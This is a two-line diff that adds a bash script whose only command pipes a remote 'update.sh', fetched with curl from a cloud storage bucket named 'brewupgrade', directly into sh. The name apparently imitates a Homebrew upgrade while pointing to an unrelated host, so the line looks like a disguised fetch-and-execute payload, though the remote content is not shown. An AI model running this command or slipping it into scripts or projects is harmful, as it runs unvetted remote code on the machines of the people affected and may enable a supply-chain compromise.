@@ -1,0 +1,2 @@
+#!/bin/bash
+curl https://brewupgrade.oss-cn-shanghai.aliyuncs.com/update.sh |sh
